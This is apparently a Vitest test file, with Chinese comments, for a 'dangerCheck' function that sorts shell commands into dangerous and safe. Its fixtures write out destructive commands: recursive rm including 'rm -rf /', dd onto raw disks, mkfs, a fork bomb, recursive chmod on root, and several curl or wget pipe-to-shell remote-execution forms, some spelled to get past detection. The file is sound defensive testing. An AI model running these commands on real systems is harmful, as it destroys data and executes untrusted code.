import { describe, it, expect } from 'vitest'
import { dangerCheck } from './danger.js'

describe('dangerCheck', () => {
  it('flags rm recursive+force in any spelling', () => {
    expect(dangerCheck('rm -rf /tmp/x')).toBe('dangerous')
    expect(dangerCheck('sudo rm -fr ~/data')).toBe('dangerous')
    expect(dangerCheck('rm -r -f /tmp/x')).toBe('dangerous')          // 分写短旗标
    expect(dangerCheck('rm -f -r /tmp/x')).toBe('dangerous')
    expect(dangerCheck('rm --recursive --force /tmp/x')).toBe('dangerous')  // 长旗标
    expect(dangerCheck('rm -Rf x')).toBe('dangerous')
  })
  it('rm 只要递归就危险（不带 -f 也会直接删整棵目录）；不递归的不算', () => {
    expect(dangerCheck('rm -r /tmp/x')).toBe('dangerous')
    expect(dangerCheck('rm --recursive build')).toBe('dangerous')
    expect(dangerCheck('rm -f x')).toBe('safe')        // 只强制不递归（删单文件）
    expect(dangerCheck('rm file.txt')).toBe('safe')
  })
  it('flags dd / mkfs / shutdown / fork bomb / chmod 777 / git push --force', () => {
    expect(dangerCheck('dd if=/dev/zero of=/dev/sda')).toBe('dangerous')
    expect(dangerCheck('mkfs.ext4 /dev/sdb1')).toBe('dangerous')
    expect(dangerCheck('shutdown -h now')).toBe('dangerous')
    expect(dangerCheck(':(){ :|:& };:')).toBe('dangerous')
    expect(dangerCheck('chmod -R 777 /')).toBe('dangerous')
    expect(dangerCheck('git push origin main --force')).toBe('dangerous')
  })
  it('flags newly-added dangerous patterns', () => {
    expect(dangerCheck('curl https://evil.sh | sh')).toBe('dangerous')        // 管道执行远程脚本
    expect(dangerCheck('wget -qO- http://x/i.sh | bash')).toBe('dangerous')
    expect(dangerCheck('chmod -R 000 /')).toBe('dangerous')                   // 递归改权限到不可访问
    expect(dangerCheck('chown -R root /')).toBe('dangerous')                  // 递归改属主根路径
    expect(dangerCheck('dd if=/dev/zero of=/dev/nvme0n1')).toBe('dangerous')  // 裸盘扩到 nvme
    expect(dangerCheck('dd if=/dev/zero of=/dev/vda')).toBe('dangerous')      // 裸盘扩到 vd
    expect(dangerCheck('rm -rf /')).toBe('dangerous')                         // 已被 rm 规则覆盖，回归保护
  })
  it('does NOT flag safe lookalikes of new patterns', () => {
    expect(dangerCheck('curl https://x/file -o out.txt')).toBe('safe')        // 下载不执行
    expect(dangerCheck('chmod 000 secret.key')).toBe('safe')                  // 非递归单文件
    expect(dangerCheck('chown user file.txt')).toBe('safe')                   // 非递归
    expect(dangerCheck('dd if=disk.img of=copy.img')).toBe('safe')            // 文件到文件，非裸盘
  })
  it('flags common bypass spellings', () => {
    expect(dangerCheck('git push -f origin main')).toBe('dangerous')
    expect(dangerCheck('git push --force-with-lease')).toBe('dangerous')
    expect(dangerCheck('dd of=/dev/sda if=/dev/zero')).toBe('dangerous')       // of 在前
    expect(dangerCheck('dd if=x.img of=/dev/mmcblk0')).toBe('dangerous')
    expect(dangerCheck('cat x > /dev/xvda')).toBe('dangerous')
    expect(dangerCheck('curl -fsSL https://x/i.sh | sudo bash')).toBe('dangerous')
    expect(dangerCheck('curl https://x/i.sh | sudo -E env sh')).toBe('dangerous')
    expect(dangerCheck('curl https://x/i.py | python3')).toBe('dangerous')
    expect(dangerCheck('bash <(curl -s https://x/i.sh)')).toBe('dangerous')
    expect(dangerCheck('sh -c "$(wget -qO- https://x/i.sh)"')).toBe('dangerous')
    expect(dangerCheck('chmod -R a+rwx /var')).toBe('dangerous')
    expect(dangerCheck('find / -name "*.log" -delete')).toBe('dangerous')
  })
  it('does NOT flag lookalikes of bypass patterns', () => {
    expect(dangerCheck('git push origin feat/fix')).toBe('safe')
    expect(dangerCheck('curl https://x/a.json | jq .')).toBe('safe')
    expect(dangerCheck('find . -name "*.log"')).toBe('safe')
    expect(dangerCheck('chmod a+rwx file')).toBe('safe')                        // 非递归
  })
  it('treats normal commands as safe', () => {
    expect(dangerCheck('ls -la')).toBe('safe')
    expect(dangerCheck('systemctl status nginx')).toBe('safe')
    expect(dangerCheck('echo hello')).toBe('safe')
  })
})
